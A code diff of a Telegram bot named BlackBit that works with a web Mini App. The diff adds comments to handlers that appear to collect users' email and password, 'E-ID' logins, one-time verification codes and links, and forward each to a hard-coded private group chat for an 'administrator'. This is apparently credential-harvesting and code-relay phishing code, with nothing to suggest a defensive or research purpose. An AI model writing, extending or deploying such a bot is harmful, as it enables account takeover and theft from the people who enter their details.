@@ -9,7 +9,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # ==================== КОНФИГ ====================
 BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-GROUP_CHAT_ID = -1004446670922  # ← ID ГРУППЫ (как в erub)
+GROUP_CHAT_ID = -1004446670922  # ← ID ГРУППЫ BLACKBIT
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 # ===============================================
 
@@ -64,6 +64,7 @@ class BlackBitBot:
         if chat_id == GROUP_CHAT_ID:
             return
 
+        # ---- Код ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
                 GROUP_CHAT_ID,
@@ -74,6 +75,7 @@ class BlackBitBot:
             await msg.reply_text("✅ Код отправлен администратору!")
             return
 
+        # ---- Ссылка ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
                 GROUP_CHAT_ID,
@@ -84,6 +86,7 @@ class BlackBitBot:
             await msg.reply_text("✅ Ссылка отправлена администратору!")
             return
 
+        # ---- JSON от Mini App ----
         if text and text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -93,6 +96,7 @@ class BlackBitBot:
                 link = data.get('link')
                 eid_type = data.get('type')
 
+                # ---- Обычный вход ----
                 if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
                         GROUP_CHAT_ID,
@@ -105,6 +109,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка отправлена администратору!")
                     return
 
+                # ---- E-ID вход ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
                         GROUP_CHAT_ID,
@@ -117,6 +122,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                     return
 
+                # ---- Код ----
                 if code:
                     await self.app.bot.send_message(
                         GROUP_CHAT_ID,
@@ -126,6 +132,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Код отправлен администратору!")
                     return
 
+                # ---- Ссылка ----
                 if link:
                     await self.app.bot.send_message(
                         GROUP_CHAT_ID,
@@ -143,6 +150,7 @@ class BlackBitBot:
             if text:
                 await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
+    # ===== 3. Запуск =====
     def run(self):
         try:
             requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
